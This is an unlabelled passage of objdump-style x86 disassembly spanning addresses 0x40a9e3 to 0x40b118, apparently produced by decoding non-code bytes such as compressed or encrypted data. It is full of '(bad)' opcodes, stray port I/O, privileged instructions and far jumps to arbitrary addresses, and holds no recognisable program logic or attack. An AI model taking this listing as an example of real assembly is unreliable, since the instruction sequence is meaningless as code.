  40a9e3:	xchg   esi,eax
  40a9e4:	rep outs dx,BYTE PTR ds:[esi]
  40a9e6:	stos   BYTE PTR es:[edi],al
  40a9e7:	xor    BYTE PTR [esi],dl
  40a9e9:	outs   dx,DWORD PTR ds:[esi]
  40a9ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a9eb:	add    DWORD PTR [edx],eax
  40a9ed:	sub    DWORD PTR [ecx+eax*8-0x5f],ecx
  40a9f1:	jp     0x40aa3d
  40a9f3:	mov    al,dl
  40a9f5:	jae    0x40aa35
  40a9f7:	push   edx
  40a9f8:	loop   0x40a9cc
  40a9fa:	jne    0x40a9b6
  40a9fc:	jo     0x40aa0e
  40a9fe:	jg     0x40aa21
  40aa00:	and    bl,BYTE PTR [esp]
  40aa03:	push   0xcd3dcbfd
  40aa08:	push   ecx
  40aa09:	jmp    0x317c:0x5bea60d
  40aa10:	and    eax,0x4963fae7
  40aa15:	fdivrp st(2),st
  40aa17:	repnz or eax,0xe6e4ac08
  40aa1d:	pop    eax
  40aa1e:	push   eax
  40aa1f:	xor    dl,BYTE PTR [eax]
  40aa21:	popf   
  40aa22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aa23:	sub    al,0x5b
  40aa25:	nop
  40aa26:	cmp    eax,DWORD PTR [esi+ebp*1+0x60]
  40aa2a:	cmp    dh,BYTE PTR [eax]
  40aa2c:	cmp    cl,BYTE PTR [edi]
  40aa2e:	mov    ds,WORD PTR ds:0x197608b
  40aa34:	scas   eax,DWORD PTR es:[edi]
  40aa35:	or     al,0xb
  40aa37:	sbb    al,0x86
  40aa39:	and    al,0xa1
  40aa3b:	mov    edx,0xacda0aa9
  40aa40:	es cld 
  40aa42:	and    al,0x16
  40aa44:	scas   al,BYTE PTR es:[edi]
  40aa45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aa46:	mov    ah,0xb1
  40aa48:	call   0x4c8dc2fc
  40aa4d:	xchg   ebp,eax
  40aa4e:	push   esp
  40aa4f:	into   
  40aa50:	repnz and al,0xda
  40aa53:	sub    ah,BYTE PTR [edi+esi*1]
  40aa56:	push   ebp
  40aa57:	int3   
  40aa58:	pusha  
  40aa59:	mov    ah,0xa3
  40aa5b:	push   eax
  40aa5c:	pop    ds
  40aa5d:	mov    ?,WORD PTR gs:[eax+edi*4-0x18]
  40aa62:	jnp    0x40aab5
  40aa64:	imul   esp,DWORD PTR [edi+0x4c],0xaad17617
  40aa6b:	scas   al,BYTE PTR es:[edi]
  40aa6c:	scas   al,BYTE PTR es:[edi]
  40aa6d:	clc    
  40aa6e:	xchg   ebx,eax
  40aa6f:	scas   eax,DWORD PTR es:[edi]
  40aa70:	sub    al,0xb
  40aa72:	xor    al,0xdf
  40aa74:	lahf   
  40aa75:	xor    esp,DWORD PTR [ebx+0x25]
  40aa78:	adc    eax,0x2c3ab7d8
  40aa7d:	mov    eax,0xaf34737c
  40aa82:	ja     0x40aaa8
  40aa84:	mov    ah,0xf3
  40aa86:	gs (bad) 
  40aa88:	in     eax,0xe5
  40aa8a:	mov    DWORD PTR [ebp+0x1b],esp
  40aa8d:	and    esp,DWORD PTR [ebx+0x66]
  40aa90:	pop    esi
  40aa91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aa92:	adc    BYTE PTR [ebx-0x25],al
  40aa95:	mov    dl,al
  40aa97:	fdivr  QWORD PTR [eax+0x2]
  40aa9a:	aad    0xd3
  40aa9c:	dec    esp
  40aa9d:	and    edi,ecx
  40aa9f:	mov    bl,0x10
  40aaa1:	adc    bl,bh
  40aaa3:	xchg   ebp,eax
  40aaa4:	jne    0x40aa3e
  40aaa6:	ins    DWORD PTR es:[edi],dx
  40aaa7:	ror    BYTE PTR [ecx],1
  40aaa9:	(bad)  
  40aaaa:	jmp    0x5715:0x2f48b474
  40aab1:	into   
  40aab2:	pushf  
  40aab3:	inc    eax
  40aab4:	(bad)  
  40aab5:	js     0x40aade
  40aab7:	pushf  
  40aab8:	dec    ecx
  40aab9:	push   edi
  40aaba:	aam    0x71
  40aabc:	in     al,dx
  40aabd:	xor    eax,0x6a278aef
  40aac2:	les    ebx,FWORD PTR [edx]
  40aac4:	sbb    al,0x9d
  40aac6:	pop    ss
  40aac7:	inc    edx
  40aac8:	xchg   ecx,eax
  40aac9:	sbb    BYTE PTR [ebx-0x45],ah
  40aacc:	and    BYTE PTR [edi-0x21],bh
  40aacf:	clc    
  40aad0:	push   ebx
  40aad1:	es pop eax
  40aad3:	mov    ebp,ds
  40aad5:	mov    dl,0xe7
  40aad7:	in     eax,0xe2
  40aad9:	xchg   BYTE PTR [ecx],ah
  40aadb:	cmp    DWORD PTR [edi],edi
  40aadd:	or     BYTE PTR [edi+0xd],0xbc
  40aae1:	xor    eax,0x5f6fdeca
  40aae6:	sbb    eax,0x6bc74f91
  40aaeb:	aam    0x38
  40aaed:	mov    esi,DWORD PTR [ecx]
  40aaef:	xchg   esi,eax
  40aaf0:	sub    DWORD PTR [eax+edi*2-0x668e180e],ecx
  40aaf7:	push   ebx
  40aaf8:	mov    esp,0x61200c99
  40aafd:	in     al,dx
  40aafe:	shr    esp,0x6b
  40ab01:	test   al,0xc5
  40ab03:	outs   dx,BYTE PTR ds:[esi]
  40ab04:	test   al,0x0
  40ab06:	adc    BYTE PTR [esi+0x16],al
  40ab09:	sub    eax,0xbda49ab
  40ab0e:	std    
  40ab0f:	adc    BYTE PTR ss:[ebp-0x7],ah
  40ab13:	das    
  40ab14:	imul   DWORD PTR [eax]
  40ab16:	add    al,0x28
  40ab18:	fidivr WORD PTR [ebp*4+0x5ba45018]
  40ab1f:	neg    BYTE PTR [ecx+0x21]
  40ab22:	and    eax,0xa9b44634
  40ab27:	push   edx
  40ab28:	sar    edx,cl
  40ab2a:	mov    esi,0xd62b965
  40ab2f:	rcl    BYTE PTR [ecx+edi*8+0xc],cl
  40ab33:	aam    0xf1
  40ab35:	mov    ds:0x280f87fa,al
  40ab3a:	add    eax,0xd2ac4bb8
  40ab3f:	push   ecx
  40ab40:	push   0x9
  40ab42:	cwde   
  40ab43:	xchg   ebx,eax
  40ab44:	ror    DWORD PTR [edx+ecx*1-0xdbd233c],cl
  40ab4b:	fisttp QWORD PTR [edi]
  40ab4d:	mov    DWORD PTR [esi],ecx
  40ab4f:	cld    
  40ab50:	inc    edi
  40ab51:	sub    DWORD PTR [eax-0x2d34b47a],0x5180bba8
  40ab5b:	ins    BYTE PTR es:[edi],dx
  40ab5c:	inc    edi
  40ab5d:	push   ebp
  40ab5e:	retf   0x961a
  40ab61:	jg     0x40abc9
  40ab63:	hlt    
  40ab64:	retf   0xb233
  40ab67:	popa   
  40ab68:	(bad)  
  40ab69:	das    
  40ab6a:	mov    bh,0xa6
  40ab6c:	mov    ecx,0x22b9ee48
  40ab71:	iret   
  40ab72:	bound  ebx,QWORD PTR [edx+0x43]
  40ab75:	leave  
  40ab76:	mov    eax,0x33b669bc
  40ab7b:	mov    dl,0xe8
  40ab7d:	leave  
  40ab7e:	dec    ebp
  40ab7f:	loop   0x40ab86
  40ab81:	jg     0x40abc3
  40ab83:	mov    eax,0x280d30a5
  40ab88:	dec    ebp
  40ab89:	or     eax,0xcd858632
  40ab8e:	call   0x1f58:0xc2698447
  40ab95:	pop    ds
  40ab96:	mov    edx,DWORD PTR [edx+0x78]
  40ab99:	mov    ah,BYTE PTR [ebp-0x47]
  40ab9c:	ror    BYTE PTR [edi+0x1d],0xa
  40aba0:	inc    eax
  40aba1:	ror    DWORD PTR [esi],1
  40aba3:	cli    
  40aba4:	fdiv   QWORD PTR [edx]
  40aba6:	jno    0x40ab51
  40aba8:	xor    DWORD PTR [eax],edi
  40abaa:	(bad)  
  40abab:	shl    BYTE PTR [ebx],1
  40abad:	stos   WORD PTR es:[edi],ax
  40abaf:	cld    
  40abb0:	mov    ah,0x2d
  40abb2:	sub    cl,BYTE PTR [eax-0x1892043f]
  40abb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40abb9:	sbb    al,0x72
  40abbb:	dec    esi
  40abbc:	jecxz  0x40ab9b
  40abbe:	fcom   QWORD PTR [esi-0x74]
  40abc1:	fst    QWORD PTR [ebx]
  40abc3:	push   0x64
  40abc5:	cli    
  40abc6:	stos   DWORD PTR es:[edi],eax
  40abc7:	adc    DWORD PTR [edi],0x93bc9227
  40abcd:	or     DWORD PTR [edi+0x6],ebx
  40abd0:	hlt    
  40abd1:	xor    ch,BYTE PTR [ecx]
  40abd3:	jno    0x40abd0
  40abd5:	xchg   esi,eax
  40abd6:	cmc    
  40abd7:	jl     0x40ab8b
  40abd9:	cmp    bl,cl
  40abdb:	stos   BYTE PTR es:[edi],al
  40abdc:	cmp    DWORD PTR [esi],ebx
  40abde:	popf   
  40abdf:	ins    BYTE PTR es:[edi],dx
  40abe0:	pop    eax
  40abe1:	xchg   esi,eax
  40abe2:	or     esp,DWORD PTR [eax+0x41c9b2a4]
  40abe8:	imul   cl
  40abea:	lods   eax,DWORD PTR ds:[esi]
  40abeb:	ss inc edx
  40abed:	push   edx
  40abee:	pop    ebp
  40abef:	rcr    BYTE PTR [edi-0xe],0xce
  40abf3:	jnp    0x40ac38
  40abf5:	or     dl,BYTE PTR [edi+0x74]
  40abf8:	ror    ah,cl
  40abfa:	dec    eax
  40abfb:	dec    eax
  40abfc:	dec    esi
  40abfd:	test   DWORD PTR [edx-0x5f],ebx
  40ac00:	inc    eax
  40ac01:	aas    
  40ac02:	mov    ch,0x2f
  40ac04:	sbb    BYTE PTR [ebx],dh
  40ac06:	std    
  40ac07:	push   edx
  40ac08:	dec    ebx
  40ac09:	mov    eax,0xb94384e5
  40ac0e:	jl     0x40ac1e
  40ac10:	jnp    0x40ac55
  40ac12:	retf   
  40ac13:	jmp    0xf9aa:0xd12f2b6c
  40ac1a:	mov    eax,0xe30a7078
  40ac1f:	jbe    0x40ac06
  40ac21:	lods   eax,DWORD PTR ds:[esi]
  40ac22:	retf   
  40ac23:	cmp    eax,0x4a63f061
  40ac28:	pop    eax
  40ac29:	in     eax,0x1
  40ac2b:	cwde   
  40ac2c:	jne    0x40acad
  40ac2e:	xchg   edi,eax
  40ac2f:	hlt    
  40ac30:	test   eax,edx
  40ac32:	dec    esp
  40ac33:	pop    eax
  40ac34:	inc    edx
  40ac35:	ret    0xe77c
  40ac38:	adc    dh,ah
  40ac3a:	stc    
  40ac3b:	and    bl,0xaf
  40ac3e:	dec    ecx
  40ac3f:	inc    edx
  40ac40:	push   esp
  40ac41:	int    0xb4
  40ac43:	arpl   si,di
  40ac45:	outs   dx,DWORD PTR ds:[esi]
  40ac46:	mov    gs,WORD PTR [edx-0x53637755]
  40ac4c:	data16 jle 0x40ac4d
  40ac4f:	push   ss
  40ac50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac51:	pop    ecx
  40ac52:	lea    esp,[ebp-0x18]
  40ac55:	(bad)  
  40ac56:	sub    DWORD PTR [eax+0x10],esi
  40ac59:	jp     0x40ac74
  40ac5b:	cdq    
  40ac5c:	retf   
  40ac5d:	or     BYTE PTR [ebx+0x27],dl
  40ac60:	enter  0x1112,0xa7
  40ac64:	scas   al,BYTE PTR es:[edi]
  40ac65:	jae    0x40ac61
  40ac67:	call   0xa1b85035
  40ac6c:	push   edx
  40ac6d:	je     0x40acdc
  40ac6f:	or     eax,0x67afd3cf
  40ac74:	ins    BYTE PTR es:[edi],dx
  40ac75:	into   
  40ac76:	xor    al,0x7b
  40ac78:	(bad)  
  40ac79:	cmp    esp,DWORD PTR ds:0x89601855
  40ac7f:	repz xor ch,BYTE PTR [ebp+0x43e9b3a6]
  40ac86:	lahf   
  40ac87:	mov    al,0x61
  40ac89:	retf   0x17b7
  40ac8c:	inc    eax
  40ac8d:	dec    ebx
  40ac8e:	fild   DWORD PTR [eax]
  40ac90:	xor    dh,BYTE PTR [ecx+0x25]
  40ac93:	or     eax,DWORD PTR [esi]
  40ac95:	call   0xdc8d:0x5b2967a3
  40ac9c:	push   ecx
  40ac9d:	pop    eax
  40ac9e:	in     eax,0x8
  40aca0:	test   al,0xe
  40aca2:	pop    edx
  40aca3:	add    ebp,edx
  40aca5:	push   ecx
  40aca6:	sahf   
  40aca7:	xchg   ebx,eax
  40aca8:	xchg   BYTE PTR [esp+edx*8],cl
  40acab:	mov    ecx,0x67e6d09f
  40acb0:	leave  
  40acb1:	add    dl,BYTE PTR [ebx-0x2f41c77a]
  40acb7:	lods   eax,DWORD PTR ds:[esi]
  40acb8:	fisub  DWORD PTR [edi-0x10]
  40acbb:	nop
  40acbc:	mov    dl,0xb8
  40acbe:	shl    BYTE PTR [edi+0x20362524],cl
  40acc4:	outs   dx,DWORD PTR ds:[esi]
  40acc5:	mov    edi,0xe08009d
  40acca:	push   ecx
  40accb:	jmp    0x1c184a1c
  40acd0:	(bad)  
  40acd1:	(bad)  [edx-0x23]
  40acd4:	mov    ebp,0x6298f4e8
  40acd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40acda:	dec    edx
  40acdb:	dec    ecx
  40acdc:	jno    0x40acaf
  40acde:	or     al,0x80
  40ace0:	jno    0x40acfb
  40ace2:	stos   BYTE PTR es:[edi],al
  40ace3:	stos   DWORD PTR es:[edi],eax
  40ace4:	std    
  40ace5:	inc    esp
  40ace6:	test   DWORD PTR [edi-0x678985ae],edx
  40acec:	or     bh,bl
  40acee:	or     eax,0x46ae53d3
  40acf3:	sub    dh,BYTE PTR [ebp-0x3]
  40acf6:	mov    dh,0x21
  40acf8:	lahf   
  40acf9:	dec    eax
  40acfa:	cmp    BYTE PTR [edx+ebx*4],al
  40acfd:	data16 jge 0x40ad64
  40ad00:	pushf  
  40ad01:	and    edi,ebp
  40ad03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ad04:	fs (bad) 
  40ad06:	and    ebx,DWORD PTR [edx-0x4]
  40ad09:	dec    eax
  40ad0a:	sar    BYTE PTR [edx-0x727afa19],0x39
  40ad11:	or     DWORD PTR [eax-0x7fcd7d82],ecx
  40ad17:	dec    edx
  40ad18:	pop    esp
  40ad19:	add    edi,ebp
  40ad1b:	sti    
  40ad1c:	mov    esi,0x39cd4ce7
  40ad21:	es pop edx
  40ad23:	and    DWORD PTR [ecx+0x3f],esp
  40ad26:	pop    edi
  40ad28:	les    ebx,FWORD PTR [eax+0x70]
  40ad2b:	or     DWORD PTR [esi-0x4f42f1e5],ebp
  40ad31:	mov    edi,0xbcc85587
  40ad36:	jge    0x40ad5a
  40ad38:	push   0x2d
  40ad3a:	mov    DWORD PTR [edi+0x721880d1],esp
  40ad40:	push   edi
  40ad41:	mov    DWORD PTR [eax-0x59],esp
  40ad44:	push   ecx
  40ad45:	lds    eax,FWORD PTR [ebx+0x4f8dc44d]
  40ad4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ad4c:	retf   
  40ad4d:	mov    BYTE PTR [esi],0xb2
  40ad50:	inc    eax
  40ad51:	dec    edi
  40ad52:	pusha  
  40ad53:	int3   
  40ad54:	jp     0x40ad92
  40ad56:	add    BYTE PTR [edi+ebx*8+0x70dde176],bh
  40ad5d:	xor    dl,BYTE PTR ds:0x16d1c550
  40ad63:	and    al,0x3a
  40ad65:	xchg   edx,eax
  40ad66:	mov    dh,0x97
  40ad68:	cmp    eax,0x3b54e5e1
  40ad6d:	sub    dh,BYTE PTR [edi+0x5c]
  40ad70:	sub    edx,DWORD PTR [eax-0x423af72]
  40ad76:	fisub  DWORD PTR [edx]
  40ad78:	pop    esi
  40ad79:	pop    esi
  40ad7a:	add    BYTE PTR [edi+ebx*8+0x8d701ed],dl
  40ad81:	or     ebp,ebx
  40ad83:	cmp    BYTE PTR [edi-0x40],dl
  40ad86:	dec    edx
  40ad87:	adc    DWORD PTR [edi],0x7f97a97b
  40ad8d:	je     0x40ad81
  40ad8f:	adc    BYTE PTR [ecx+0x32],al
  40ad92:	fs pop es
  40ad94:	inc    edx
  40ad95:	push   0xffffffa0
  40ad97:	nop
  40ad98:	fimul  DWORD PTR [edx+0x39d79520]
  40ad9e:	xor    ecx,ebp
  40ada0:	mov    DWORD PTR [edx+ebp*2-0x2a249235],esi
  40ada7:	cli    
  40ada8:	mov    eax,ds:0x424a5b2f
  40adad:	fisubr DWORD PTR [ebx]
  40adaf:	fucomip st,st(0)
  40adb1:	push   edi
  40adb2:	sbb    BYTE PTR [edi],bl
  40adb4:	in     al,0xa7
  40adb6:	shl    DWORD PTR [edx],1
  40adb8:	repz inc edx
  40adba:	inc    ebp
  40adbb:	fidiv  DWORD PTR [eax]
  40adbd:	jle    0x40ad56
  40adbf:	jmp    0xc0cf580
  40adc4:	mov    ebp,DWORD PTR [ebp+0x10]
  40adc7:	and    eax,0x5d8073bb
  40adcc:	mov    esi,0xa760c6b
  40add1:	inc    eax
  40add2:	sbb    eax,0x956f4161
  40add7:	jae    0x40ad6d
  40add9:	inc    ebx
  40adda:	sahf   
  40addb:	std    
  40addc:	push   ds
  40addd:	dec    ebp
  40adde:	cmp    eax,0xcba17994
  40ade3:	icebp  
  40ade4:	pushf  
  40ade5:	adc    al,BYTE PTR [eax+esi*2]
  40ade8:	adc    BYTE PTR [edi],dh
  40adea:	(bad)
  40aded:	push   ebx
  40adee:	cmp    al,0xe2
  40adf0:	mov    edx,0x91f62c63
  40adf5:	hlt    
  40adf6:	or     esp,DWORD PTR [eax]
  40adf8:	ret    
  40adf9:	mov    edi,0xc58d4539
  40adfe:	and    eax,DWORD PTR [ecx+0xa41db0e]
  40ae04:	mov    ?,WORD PTR [edx+0x34]
  40ae07:	xchg   BYTE PTR [edi+0x6a680d66],cl
  40ae0d:	mov    eax,ds:0xdaa057c6
  40ae12:	sbb    bh,BYTE PTR [eax+0x7f]
  40ae15:	das    
  40ae16:	jl     0x40addf
  40ae18:	call   0xff1f:0x5b5022f1
  40ae1f:	dec    BYTE PTR [edi]
  40ae21:	push   ss
  40ae22:	lock mov ds:0x4440f53a,al
  40ae28:	outs   dx,DWORD PTR ds:[esi]
  40ae29:	fld    TBYTE PTR [edi]
  40ae2b:	jbe    0x40adc3
  40ae2d:	inc    esi
  40ae2e:	ret    0xa89f
  40ae31:	mov    edi,0x65c6438b
  40ae36:	or     eax,0x41f2fb7a
  40ae3b:	nop
  40ae3c:	adc    eax,0x1aeb35d7
  40ae41:	sub    BYTE PTR [ebx],cl
  40ae43:	add    eax,0xc51a3ec2
  40ae48:	into   
  40ae49:	loopne 0x40ae44
  40ae4b:	bound  edx,QWORD PTR [edx]
  40ae4d:	dec    esi
  40ae4e:	lahf   
  40ae4f:	retf   0xdda3
  40ae52:	fs pop ebx
  40ae54:	loop   0x40ae19
  40ae56:	push   ds
  40ae57:	cmp    edi,eax
  40ae59:	outs   dx,BYTE PTR ds:[esi]
  40ae5a:	dec    esp
  40ae5b:	rcr    DWORD PTR [esi],cl
  40ae5d:	mov    ebx,0xc633485d
  40ae62:	and    edx,DWORD PTR [edi+ecx*4+0x70a6d02e]
  40ae69:	popa   
  40ae6a:	mov    esp,0x8afb447b
  40ae6f:	data16 (bad) 
  40ae71:	es dec edx
  40ae73:	push   ebp
  40ae74:	inc    esp
  40ae75:	cmp    BYTE PTR [ecx+0x8],bh
  40ae78:	lods   al,BYTE PTR ds:[esi]
  40ae79:	xor    DWORD PTR [eax+esi*8+0x0],esp
  40ae7d:	and    al,BYTE PTR [edi-0x32]
  40ae80:	sbb    al,0x85
  40ae82:	xchg   edx,eax
  40ae83:	inc    eax
  40ae84:	dec    ecx
  40ae85:	or     eax,0x93a2a450
  40ae8a:	loope  0x40ae50
  40ae8c:	fidiv  DWORD PTR [esi-0x16]
  40ae8f:	loop   0x40ae54
  40ae91:	adc    eax,0xac8be05c
  40ae96:	retf   0x417e
  40ae99:	popa   
  40ae9a:	xor    BYTE PTR [esi-0x68],bl
  40ae9d:	inc    ebp
  40ae9e:	and    BYTE PTR cs:[ebx+ebp*2],dh
  40aea2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aea3:	ds push ecx
  40aea5:	data16 mul BYTE PTR [ebx-0x53115ed6]
  40aeac:	xchg   ebp,eax
  40aead:	cmp    eax,0x5d25554b
  40aeb2:	test   BYTE PTR ds:0x9e57cd6d,0x1b
  40aeb9:	sbb    DWORD PTR [edx],esp
  40aebb:	dec    eax
  40aebc:	jl     0x40aeba
  40aebe:	lahf   
  40aebf:	retf   
  40aec0:	imul   BYTE PTR [ecx]
  40aec2:	inc    ecx
  40aec3:	out    0xa6,al
  40aec5:	push   cs
  40aec6:	int    0xf0
  40aec8:	fdivr  DWORD PTR [ebx-0x14]
  40aecb:	std    
  40aecc:	imul   ecx,DWORD PTR [ecx-0x26],0xc70c474a
  40aed3:	pop    ebx
  40aed4:	cmp    al,0x61
  40aed6:	aaa    
  40aed7:	push   ss
  40aed8:	sbb    ah,BYTE PTR [ecx-0x5]
  40aedb:	das    
  40aedc:	(bad)  
  40aedd:	adc    al,0x3e
  40aedf:	icebp  
  40aee0:	xchg   esp,eax
  40aee1:	jmp    0xaea:0x416c2645
  40aee8:	ss fucomip st,st(6)
  40aeeb:	popa   
  40aeec:	std    
  40aeed:	imul   edi,edi,0x3dbf64b2
  40aef3:	pop    esi
  40aef4:	js     0x40aef5
  40aef6:	jecxz  0x40aed6
  40aef8:	cmc    
  40aef9:	in     al,0x4d
  40aefb:	push   eax
  40aefc:	pop    edx
  40aefd:	jnp    0x40af43
  40aeff:	test   eax,0x29344de5
  40af04:	sub    esp,ecx
  40af06:	jmp    0xce95:0xedc56890
  40af0d:	inc    esp
  40af0e:	jp     0x40af11
  40af10:	xor    eax,0x48c2e548
  40af15:	jl     0x40af93
  40af17:	xchg   eax,edx
  40af19:	sbb    cl,cl
  40af1b:	mov    bh,0x6f
  40af1d:	xchg   ebx,eax
  40af1e:	and    DWORD PTR [edi+esi*1],0xe08002e7
  40af25:	jl     0x40af63
  40af27:	and    eax,DWORD PTR [ecx]
  40af29:	iret   
  40af2a:	stc    
  40af2b:	sub    BYTE PTR [ebx-0x47e6f1cd],bl
  40af31:	(bad)  
  40af33:	mov    eax,ds:0xec13bc86
  40af38:	jns    0x40af80
  40af3a:	rcr    DWORD PTR [ebx+0x3a565279],1
  40af40:	push   esi
  40af41:	xor    dh,dh
  40af43:	stos   BYTE PTR es:[edi],al
  40af44:	pop    esp
  40af45:	lods   al,BYTE PTR ds:[esi]
  40af46:	cs (bad) 
  40af48:	xchg   ecx,ecx
  40af4a:	xchg   ebp,eax
  40af4b:	in     al,dx
  40af4c:	ret    0xb2a1
  40af4f:	mov    edx,0x54d0a310
  40af54:	or     al,0x40
  40af56:	push   ebx
  40af57:	dec    edx
  40af58:	add    al,0xd1
  40af5a:	les    esp,FWORD PTR [ecx+0x77]
  40af5d:	adc    eax,0xca4a9a16
  40af62:	sbb    BYTE PTR [eax+0x6a],dh
  40af65:	or     esp,DWORD PTR [edi+0x2103f621]
  40af6b:	adc    al,0x2
  40af6d:	das    
  40af6e:	mov    cs,edx
  40af70:	pop    edi
  40af71:	clc    
  40af72:	sbb    ah,ch
  40af74:	mov    ebx,0x79275592
  40af79:	in     eax,0xd6
  40af7b:	cs std 
  40af7d:	repnz sub eax,0x4645e8c
  40af83:	sbb    DWORD PTR ds:0x9210308c,0x26ad1164
  40af8d:	cld    
  40af8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af8f:	xlat   BYTE PTR ds:[ebx]
  40af90:	xor    ch,bl
  40af92:	fs gs pop ebp
  40af95:	in     al,dx
  40af96:	in     al,0xfb
  40af98:	cmp    al,BYTE PTR [edx]
  40af9a:	lock shr DWORD PTR [eax],0x7b
  40af9e:	pushf  
  40af9f:	vmread DWORD PTR [ebp-0x77],ebx
  40afa3:	daa    
  40afa4:	call   0x54fca13e
  40afa9:	xlat   BYTE PTR ds:[ebx]
  40afaa:	push   esp
  40afab:	fild   QWORD PTR [eax]
  40afad:	push   ebp
  40afae:	out    dx,eax
  40afaf:	(bad)  
  40afb0:	jbe    0x40afac
  40afb2:	jns    0x40b01e
  40afb4:	dec    esi
  40afb5:	sbb    BYTE PTR [eax],cl
  40afb7:	mov    ds:0x6e23f621,al
  40afbc:	pop    esi
  40afbd:	cmp    edi,DWORD PTR [ecx]
  40afbf:	pop    esp
  40afc0:	add    eax,0xee3e3c39
  40afc5:	add    eax,0x451ad2d1
  40afcb:	in     eax,dx
  40afcc:	popf   
  40afcd:	cmp    DWORD PTR [ebp+0x30e20a5],ebx
  40afd3:	int3   
  40afd4:	pop    ss
  40afd5:	pop    ecx
  40afd6:	in     eax,0xd9
  40afd8:	add    ebx,DWORD PTR [bx+si+0x17]
  40afdc:	mov    dh,BYTE PTR [edi-0x36a844d8]
  40afe2:	mov    DWORD PTR [eax-0x74],esi
  40afe5:	xor    bl,al
  40afe7:	iret   
  40afe8:	lock aad 0x35
  40afeb:	mov    dh,0x93
  40afed:	in     al,0xe3
  40afef:	pop    esp
  40aff0:	pop    esi
  40aff1:	sub    al,dl
  40aff3:	das    
  40aff4:	push   es
  40aff5:	ds xchg edx,eax
  40aff7:	mov    edi,0xa0418aa
  40affc:	test   DWORD PTR [ebx-0x6a],esp
  40afff:	sub    DWORD PTR [esp+ebp*4-0x653389b1],edx
  40b006:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b007:	loop   0x40b041
  40b009:	mov    ebp,0xde33dcda
  40b00e:	out    0x38,al
  40b010:	sub    bl,ah
  40b012:	inc    esi
  40b013:	adc    ebp,DWORD PTR [esi+0x31]
  40b016:	outs   dx,DWORD PTR ds:[esi]
  40b017:	or     esp,ebx
  40b019:	out    0x4a,eax
  40b01b:	dec    edi
  40b01c:	fsubr  DWORD PTR [eax-0x30]
  40b01f:	sahf   
  40b020:	jmp    0x7e80a656
  40b025:	iret   
  40b026:	add    al,0x80
  40b028:	call   0xe146:0xab7f5596
  40b02f:	mov    edi,0xb675b5e5
  40b034:	int    0x54
  40b036:	push   es
  40b037:	call   0x807a:0x169b2723
  40b03e:	stc    
  40b03f:	jmp    FWORD PTR ds:0x573b4653
  40b045:	shl    BYTE PTR [eax-0x801fd16],cl
  40b04b:	jp     0x40b069
  40b04d:	mov    dh,cl
  40b04f:	int    0xd8
  40b051:	test   BYTE PTR [ebx],dh
  40b053:	pop    edx
  40b054:	xchg   edx,eax
  40b055:	and    bh,BYTE PTR [edx+0x67d31022]
  40b05b:	mov    dl,0x9e
  40b05d:	test   edx,0x5044f194
  40b063:	stos   BYTE PTR es:[edi],al
  40b064:	pop    ss
  40b065:	cld    
  40b066:	mov    eax,ds:0x4fec2b71
  40b06b:	adc    BYTE PTR [esi-0x3c],dl
  40b06e:	outs   dx,DWORD PTR ds:[esi]
  40b06f:	int3   
  40b070:	outs   dx,BYTE PTR ds:[esi]
  40b071:	cs pop esp
  40b073:	fdivr  QWORD PTR [ebx]
  40b075:	sub    al,0x27
  40b077:	mov    al,ds:0xe28662ac
  40b07c:	dec    eax
  40b07d:	fcomp  QWORD PTR [esi+0x6e]
  40b080:	adc    BYTE PTR [edi+0x6f],dh
  40b083:	les    edi,FWORD PTR [edx-0x1b]
  40b086:	cli    
  40b087:	repz dec edx
  40b089:	call   0xbf7ebec2
  40b08e:	or     al,0xc1
  40b090:	retf   0x8f02
  40b093:	inc    edi
  40b094:	mov    WORD PTR ds:[edx+0x5a],ss
  40b098:	lock lods eax,DWORD PTR ds:[esi]
  40b09a:	jmp    0x40b112
  40b09c:	or     ebp,DWORD PTR [ebp+0x35]
  40b09f:	xor    eax,0x6b20dca8
  40b0a4:	addr16 cmp eax,0xe7b1a942
  40b0aa:	mov    esp,0x2b9c4c5e
  40b0af:	test   BYTE PTR [ebp-0x50e22149],cl
  40b0b5:	es out dx,al
  40b0b7:	sub    DWORD PTR [esi],eax
  40b0b9:	push   eax
  40b0ba:	inc    ebx
  40b0bb:	sub    ch,BYTE PTR [ecx-0x4d]
  40b0be:	lahf   
  40b0bf:	loopne 0x40b0b5
  40b0c1:	jp     0x40b11f
  40b0c3:	mov    gs,esp
  40b0c5:	pop    esp
  40b0c6:	push   es
  40b0c7:	sub    DWORD PTR [edi*4-0x4375b1cc],edi
  40b0ce:	lahf   
  40b0cf:	and    al,dh
  40b0d1:	jno    0x40b0db
  40b0d3:	cmp    al,BYTE PTR [ebp+ebp*2+0x212966d]
  40b0da:	jo     0x40b0d8
  40b0dc:	pushf  
  40b0dd:	(bad)  
  40b0de:	in     eax,dx
  40b0df:	dec    esi
  40b0e0:	fist   DWORD PTR [eax-0x4f]
  40b0e3:	(bad)  
  40b0e4:	jae    0x40b10b
  40b0e6:	jb     0x40b0e3
  40b0e8:	push   ebp
  40b0e9:	inc    ecx
  40b0ea:	jb     0x40b162
  40b0ec:	push   ecx
  40b0ed:	mov    ah,0x7c
  40b0ef:	popf   
  40b0f0:	adc    BYTE PTR [esi+0x19176625],bh
  40b0f6:	daa    
  40b0f7:	jae    0x40b0df
  40b0f9:	xchg   edx,eax
  40b0fa:	sub    al,0xed
  40b0fc:	dec    edi
  40b0fd:	in     al,dx
  40b0fe:	adc    BYTE PTR [edx-0x19ce9097],dh
  40b104:	stos   DWORD PTR es:[edi],eax
  40b105:	dec    esi
  40b106:	jbe    0x40b0a9
  40b108:	imul   ebx,DWORD PTR [edi+0xb],0xffffffb6
  40b10c:	into   
  40b10d:	jno    0x40b18d
  40b10f:	(bad)  
  40b110:	popa   
  40b111:	ss scas al,BYTE PTR es:[edi]
  40b113:	in     eax,0xd1
  40b115:	push   ebx
  40b116:	sahf   
  40b117:	inc    edi
  40b118:	lods   eax,DWORD PTR ds:[esi]
